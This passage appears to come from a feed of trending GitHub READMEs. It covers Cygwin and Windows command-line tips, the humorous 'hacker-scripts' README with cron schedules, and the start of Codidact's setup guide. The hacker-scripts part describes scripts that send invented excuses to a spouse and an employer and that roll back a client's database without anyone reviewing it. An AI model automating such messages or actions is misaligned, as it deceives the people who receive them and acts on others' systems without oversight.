&lt;h3&gt;&lt;a id="user-content-ways-to-obtain-unix-tools-under-windows" class="anchor" aria-hidden="true" href="#ways-to-obtain-unix-tools-under-windows"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Ways to obtain Unix tools under Windows&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Access the power of the Unix shell under Microsoft Windows by installing &lt;a href="https://cygwin.com/" rel="nofollow"&gt;Cygwin&lt;/a&gt;. Most of the things described in this document will work out of the box.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;On Windows 10, you can use &lt;a href="https://msdn.microsoft.com/commandline/wsl/about" rel="nofollow"&gt;Windows Subsystem for Linux (WSL)&lt;/a&gt;, which provides a familiar Bash environment with Unix command line utilities.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;If you mainly want to use GNU developer tools (such as GCC) on Windows, consider &lt;a href="http://www.mingw.org/" rel="nofollow"&gt;MinGW&lt;/a&gt; and its &lt;a href="http://www.mingw.org/wiki/msys" rel="nofollow"&gt;MSYS&lt;/a&gt; package, which provides utilities such as bash, gawk, make and grep. MSYS doesn't have all the features compared to Cygwin. MinGW is particularly useful for creating native Windows ports of Unix tools.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Another option to get Unix look and feel under Windows is &lt;a href="https://github.com/dthree/cash"&gt;Cash&lt;/a&gt;. Note that only very few Unix commands and command-line options are available in this environment.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-useful-windows-command-line-tools" class="anchor" aria-hidden="true" href="#useful-windows-command-line-tools"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Useful Windows command-line tools&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;You can perform and script most Windows system administration tasks from the command line by learning and using &lt;code&gt;wmic&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Native command-line Windows networking tools you may find useful include &lt;code&gt;ping&lt;/code&gt;, &lt;code&gt;ipconfig&lt;/code&gt;, &lt;code&gt;tracert&lt;/code&gt;, and &lt;code&gt;netstat&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;You can perform &lt;a href="http://www.thewindowsclub.com/rundll32-shortcut-commands-windows" rel="nofollow"&gt;many useful Windows tasks&lt;/a&gt; by invoking the &lt;code&gt;Rundll32&lt;/code&gt; command.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-cygwin-tips-and-tricks" class="anchor" aria-hidden="true" href="#cygwin-tips-and-tricks"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Cygwin tips and tricks&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Install additional Unix programs with the Cygwin's package manager.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Use &lt;code&gt;mintty&lt;/code&gt; as your command-line window.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Access the Windows clipboard through &lt;code&gt;/dev/clipboard&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Run &lt;code&gt;cygstart&lt;/code&gt; to open an arbitrary file through its registered application.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Access the Windows registry with &lt;code&gt;regtool&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Note that a &lt;code&gt;C:\&lt;/code&gt; Windows drive path becomes &lt;code&gt;/cygdrive/c&lt;/code&gt; under Cygwin, and that Cygwin's &lt;code&gt;/&lt;/code&gt; appears under &lt;code&gt;C:\cygwin&lt;/code&gt; on Windows. Convert between Cygwin and Windows-style file paths with &lt;code&gt;cygpath&lt;/code&gt;. This is most useful in scripts that invoke Windows programs.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-more-resources" class="anchor" aria-hidden="true" href="#more-resources"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;More resources&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/alebcay/awesome-shell"&gt;awesome-shell&lt;/a&gt;: A curated list of shell tools and resources.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/herrbischoff/awesome-osx-command-line"&gt;awesome-osx-command-line&lt;/a&gt;: A more in-depth guide for the macOS command line.&lt;/li&gt;
&lt;li&gt;&lt;a href="http://redsymbol.net/articles/unofficial-bash-strict-mode/" rel="nofollow"&gt;Strict mode&lt;/a&gt; for writing better shell scripts.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/koalaman/shellcheck"&gt;shellcheck&lt;/a&gt;: A shell script static analysis tool. Essentially, lint for bash/sh/zsh.&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.dwheeler.com/essays/filenames-in-shell.html" rel="nofollow"&gt;Filenames and Pathnames in Shell&lt;/a&gt;: The sadly complex minutiae on how to handle filenames correctly in shell scripts.&lt;/li&gt;
&lt;li&gt;&lt;a href="http://datascienceatthecommandline.com/#tools" rel="nofollow"&gt;Data Science at the Command Line&lt;/a&gt;: More commands and tools helpful for doing data science, from the book of the same name&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-disclaimer" class="anchor" aria-hidden="true" href="#disclaimer"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disclaimer&lt;/h2&gt;
&lt;p&gt;With the exception of very small tasks, code is written so others can read it. With power comes responsibility. The fact you &lt;em&gt;can&lt;/em&gt; do something in Bash doesn't necessarily mean you should! ;)&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-license" class="anchor" aria-hidden="true" href="#license"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;License&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://creativecommons.org/licenses/by-sa/4.0/" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/e170e276291254896665fa8f612b99fe5b7dd005/68747470733a2f2f692e6372656174697665636f6d6d6f6e732e6f72672f6c2f62792d73612f342e302f38387833312e706e67" alt="Creative Commons License" data-canonical-src="https://i.creativecommons.org/l/by-sa/4.0/88x31.png" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This work is licensed under a &lt;a href="http://creativecommons.org/licenses/by-sa/4.0/" rel="nofollow"&gt;Creative Commons Attribution-ShareAlike 4.0 International License&lt;/a&gt;.&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>jlevy</author><guid isPermaLink="false">https://github.com/jlevy/the-art-of-command-line</guid><pubDate>Sun, 19 Jan 2020 00:12:00 GMT</pubDate></item><item><title>NARKOZ/hacker-scripts #13 in All Languages, Today</title><link>https://github.com/NARKOZ/hacker-scripts</link><description>&lt;p&gt;&lt;i&gt;Based on a true story&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;h1&gt;&lt;a id="user-content-hacker-scripts" class="anchor" aria-hidden="true" href="#hacker-scripts"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Hacker Scripts&lt;/h1&gt;
&lt;p&gt;Based on a &lt;em&gt;&lt;a href="https://www.jitbit.com/alexblog/249-now-thats-what-i-call-a-hacker/" rel="nofollow"&gt;true
story&lt;/a&gt;&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;xxx: OK, so, our build engineer has left for another company. The dude was literally living inside the terminal. You know, that type of a guy who loves Vim, creates diagrams in Dot and writes wiki-posts in Markdown... If something - anything - requires more than 90 seconds of his time, he writes a script to automate that.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;xxx: So we're sitting here, looking through his, uhm, "legacy"&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;xxx: You're gonna love this&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;xxx: &lt;a href="https://github.com/NARKOZ/hacker-scripts/blob/master/smack-my-bitch-up.sh"&gt;&lt;code&gt;smack-my-bitch-up.sh&lt;/code&gt;&lt;/a&gt; - sends a text message "late at work" to his wife (apparently). Automatically picks reasons from an array of strings, randomly. Runs inside a cron-job. The job fires if there are active SSH-sessions on the server after 9pm with his login.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;xxx: &lt;a href="https://github.com/NARKOZ/hacker-scripts/blob/master/kumar-asshole.sh"&gt;&lt;code&gt;kumar-asshole.sh&lt;/code&gt;&lt;/a&gt; - scans the inbox for emails from "Kumar" (a DBA at our clients). Looks for keywords like "help", "trouble", "sorry" etc. If keywords are found - the script SSHes into the clients server and rolls back the staging database to the latest backup. Then sends a reply "no worries mate, be careful next time".&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;xxx: &lt;a href="https://github.com/NARKOZ/hacker-scripts/blob/master/hangover.sh"&gt;&lt;code&gt;hangover.sh&lt;/code&gt;&lt;/a&gt; - another cron-job that is set to specific dates. Sends automated emails like "not feeling well/gonna work from home" etc. Adds a random "reason" from another predefined array of strings. Fires if there are no interactive sessions on the server at 8:45am.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;xxx: (and the oscar goes to) &lt;a href="https://github.com/NARKOZ/hacker-scripts/blob/master/fucking-coffee.sh"&gt;&lt;code&gt;fucking-coffee.sh&lt;/code&gt;&lt;/a&gt; - this one waits exactly 17 seconds (!), then opens a telnet session to our coffee-machine (we had no frikin idea the coffee machine is on the network, runs linux and has a TCP socket up and running) and sends something like &lt;code&gt;sys brew&lt;/code&gt;. Turns out this thing starts brewing a mid-sized half-caf latte and waits another 24 (!) seconds before pouring it into a cup. The timing is exactly how long it takes to walk to the machine from the dudes desk.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;xxx: holy sh*t I'm keeping those&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Original: &lt;a href="http://bash.im/quote/436725" rel="nofollow"&gt;http://bash.im/quote/436725&lt;/a&gt; (in Russian)&lt;br&gt;
Pull requests with other implementations (Python, Perl, Shell, etc) are welcome.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-usage" class="anchor" aria-hidden="true" href="#usage"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Usage&lt;/h2&gt;
&lt;p&gt;You need these environment variables:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; used in `smack-my-bitch-up` and `hangover` scripts&lt;/span&gt;
TWILIO_ACCOUNT_SID=ACxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
TWILIO_AUTH_TOKEN=yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; used in `kumar_asshole` script&lt;/span&gt;
GMAIL_USERNAME=admin@example.org
GMAIL_PASSWORD=password&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;For Ruby scripts you need to install gems:
&lt;code&gt;gem install dotenv twilio-ruby gmail&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-cron-jobs" class="anchor" aria-hidden="true" href="#cron-jobs"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Cron jobs&lt;/h2&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Runs `smack-my-bitch-up.sh` monday to friday at 9:20 pm.&lt;/span&gt;
20 21 &lt;span class="pl-k"&gt;*&lt;/span&gt; &lt;span class="pl-k"&gt;*&lt;/span&gt; 1-5 /path/to/scripts/smack-my-bitch-up.sh &lt;span class="pl-k"&gt;&amp;gt;&amp;gt;&lt;/span&gt; /path/to/smack-my-bitch-up.log &lt;span class="pl-k"&gt;2&amp;gt;&amp;amp;1&lt;/span&gt;

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Runs `hangover.sh` monday to friday at 8:45 am.&lt;/span&gt;
45 8 &lt;span class="pl-k"&gt;*&lt;/span&gt; &lt;span class="pl-k"&gt;*&lt;/span&gt; 1-5 /path/to/scripts/hangover.sh &lt;span class="pl-k"&gt;&amp;gt;&amp;gt;&lt;/span&gt; /path/to/hangover.log &lt;span class="pl-k"&gt;2&amp;gt;&amp;amp;1&lt;/span&gt;

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Runs `kumar-asshole.sh` every 10 minutes.&lt;/span&gt;
&lt;span class="pl-k"&gt;*&lt;/span&gt;/10 &lt;span class="pl-k"&gt;*&lt;/span&gt; &lt;span class="pl-k"&gt;*&lt;/span&gt; &lt;span class="pl-k"&gt;*&lt;/span&gt; &lt;span class="pl-k"&gt;*&lt;/span&gt; /path/to/scripts/kumar-asshole.sh

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Runs `fucking-coffee.sh` hourly from 9am to 6pm on weekdays.&lt;/span&gt;
0 9-18 &lt;span class="pl-k"&gt;*&lt;/span&gt; &lt;span class="pl-k"&gt;*&lt;/span&gt; 1-5 /path/to/scripts/fucking-coffee.sh&lt;/pre&gt;&lt;/div&gt;
&lt;hr&gt;
&lt;p&gt;Code is released under WTFPL.&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>NARKOZ</author><guid isPermaLink="false">https://github.com/NARKOZ/hacker-scripts</guid><pubDate>Sun, 19 Jan 2020 00:13:00 GMT</pubDate></item><item><title>codidact/core #14 in All Languages, Today</title><link>https://github.com/codidact/core</link><description>&lt;p&gt;&lt;i&gt;The core Codidact Q&amp;A software implementation&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;h1&gt;&lt;a id="user-content-codidactcore" class="anchor" aria-hidden="true" href="#codidactcore"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Codidact/Core&lt;/h1&gt;
&lt;p&gt;The core Codidact Q&amp;amp;A software implementation.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-huh" class="anchor" aria-hidden="true" href="#huh"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Huh?&lt;/h2&gt;
&lt;p&gt;Codidact is community-driven Q&amp;amp;A software: created, maintained, used, and run by the community, for the community. There's no
money-making company behind this.&lt;/p&gt;
&lt;p&gt;We're currently in the early stages of development, but once we have a working MVP, we'll be hosting a public Codidact instance
for everyone to use. The software will also be available to download and run yourself to host your instance under your own
rules.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-installation" class="anchor" aria-hidden="true" href="#installation"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Installation&lt;/h2&gt;
&lt;p&gt;These instructions are for setting up and running a local development instance of Codidact.&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-technology-stack" class="anchor" aria-hidden="true" href="#technology-stack"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Technology Stack&lt;/h4&gt;
&lt;p&gt;A list of the current tech stack is &lt;a href="https://github.com/codidact/docs/wiki/Technology-Stack"&gt;here&lt;/a&gt;.
These items will be installed in the steps below, but if all of these are already installed on your
system you can skip straight to running the project.&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-windows" class="anchor" aria-hidden="true" href="#windows"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Windows&lt;/h4&gt;
&lt;p&gt;We'll be using Visual Studio for this setup.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="https://visualstudio.microsoft.com/downloads/" rel="nofollow"&gt;Download Visual Studio 2019 Community&lt;/a&gt; and start up the installer. If you
already have VS2019 installed, run the Visual Studio Installer instead.&lt;/li&gt;
&lt;li&gt;When prompted to select workloads, select the "ASP.NET and Web Development" workload, and then install it.&lt;/li&gt;
&lt;li&gt;Once the installation is complete, clone/download this repository and extract it somewhere.&lt;/li&gt;
&lt;li&gt;In the root of the repository, open the &lt;code&gt;Codidact.sln&lt;/code&gt; file with visual studio to get started.&lt;/li&gt;
&lt;li&gt;Visual Studio will attempt to install any missing packages. This usually requires no additional action, &lt;em&gt;but if it fails to do so,
&lt;a href="https://docs.microsoft.com/en-US/nuget/consume-packages/package-restore" rel="nofollow"&gt;perform a package restore&lt;/a&gt;.&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Once Visual Studio has finished loading, you can run Codidact by setting the WebUI project as the startup project. You'll
know you're ready to run the project when a Start IIS Express button appears.&lt;/li&gt;
&lt;li&gt;See the Database Setup instructions below&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Alternatively, if you don't want to run Visual Studio just to start the project, you can navigate to the src/WebUI folder
(so that &lt;code&gt;WebUI.csproj&lt;/code&gt; is in your working directory) and issue the command &lt;code&gt;dotnet run&lt;/code&gt;.&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-linux" class="anchor" aria-hidden="true" href="#linux"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Linux&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="https://docs.microsoft.com/en-us/dotnet/core/install/linux-package-manager-ubuntu-1904" rel="nofollow"&gt;Download .NET Core SDK&lt;/a&gt;. Specifically,
from this page, follow the sections labeled "Register Microsoft Key and feed" and "Install the .NET Core SDK"&lt;/li&gt;
&lt;li&gt;Once the installation is complete, clone/download the repository and extract it somewhere.&lt;/li&gt;
&lt;li&gt;You can run Codidact by navigating to the src/WebUI folder (so that &lt;code&gt;WebUI.csproj&lt;/code&gt; is in your working directory) and issuing
the command &lt;code&gt;dotnet run&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;
